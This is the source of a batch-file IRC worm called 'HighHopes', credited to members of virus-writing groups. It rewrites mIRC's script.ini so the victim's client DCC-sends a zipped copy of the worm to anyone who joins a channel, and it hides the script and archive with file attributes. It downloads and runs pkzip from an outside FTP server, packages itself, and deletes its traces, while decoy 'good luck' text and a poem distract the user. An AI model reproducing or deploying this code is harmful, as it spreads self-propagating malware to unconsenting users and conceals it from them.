@echo off
::IRC.HighHopes.c
::by -KD- [Metaphase VX Team & NoMercyVirusTeam]
::Greets to Evul, Tally, AngelsKitten, KidCypher, nucleii,
::Roadkil, Zanat0s, Duke, Lys, Jackie, Foxz, darkman, lea
::Raven, Deloss, JFK, BSL4, and -Everyone- in #virus
if errorlevel 1 goto noscr
c:
md c:\pkdown >nul
echo [script]>>c:\mirc\script.ini
echo n0=;HighHopes.a>>c:\mirc\script.ini
echo n1=;by -KD- [Metaphase VX Team & NoMercyVirusTeam]>>c:\mirc\script.ini
echo n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }>>c:\mirc\script.ini
echo n3= /dcc send $nick C:\mirc\hope.zip>>c:\mirc\script.ini
echo n4=}>>c:\mirc\script.ini
echo n5=>>c:\mirc\script.ini
echo n6=ON 1:QUIT:#:/msg $chan The grass was greener.>>c:\mirc\script.ini
echo n7=ON 1:connect: {>>c:\mirc\script.ini
echo n9=  /run attrib +r +s +h C:\mirc\script.ini>>c:\mirc\script.ini
echo n10= /run attrib +r +s +h C:\mirc\hope.zip>>c:\mirc\script.ini
echo n11=}>>c:\mirc\script.ini
echo open ftp.elkhart.net>>c:\ftpme.txt
echo anonymous>>c:\ftpme.txt
echo username@nowhere.com>>c:\ftpme.txt
echo cd pub>>c:\ftpme.txt
echo cd shareware>>c:\ftpme.txt
echo binary>>c:\ftpme.txt
echo hash>>c:\ftpme.txt
echo lcd c:\pkdown>>c:\ftpme.txt
echo get pkzip204.exe>>c:\ftpme.txt
echo bye>>c:\ftpme.txt
:noscr
echo Keep this open for to have Good Luck!           >>c:\highhopes1.txt
echo When it closes you will have Good Luck!         >>c:\highhopes1.txt
echo Some one has high hopes for You!!               >>c:\highhopes1.txt
@echo on
type c:\highhopes1.txt
@echo off
echo y| del c:\highhopes1.txt >nul
if errorlevel 1 goto noftp
%windir%\ftp.exe -s:c:\ftpme.txt >nul
:noftp
echo                                                 >>c:\highhopes.txt
echo The grass was greener. The light was brigher.   >>c:\highhopes.txt
echo The taste was sweeter. The nights of wonder.    >>c:\highhopes.txt
echo With friends sorrounding. The dawn mist glowing.>>c:\highhopes.txt
echo The water flowing. The endless river.           >>c:\highhopes.txt
echo For Ever And Ever.....                          >>c:\highhopes.txt
@echo on
type c:\highhopes.txt
@echo off
if errorlevel 1 goto nogo
echo y| del c:\highhopes.txt >nul
cd \pkdown
c:\pkdown\pkzip204.exe >nul
echo y| copy %0 c:\pkdown\highhopes.bat >nul
c:\pkdown\pkzip hope.zip highho~1.bat >nul
echo y| copy hope.zip c:\mirc >nul
cd \
echo y| del c:\pkdown\*.* >nul
rd c:\pkdown >nul
echo y| del c:\ftpme.txt >nul
nogo:
@echo off
cls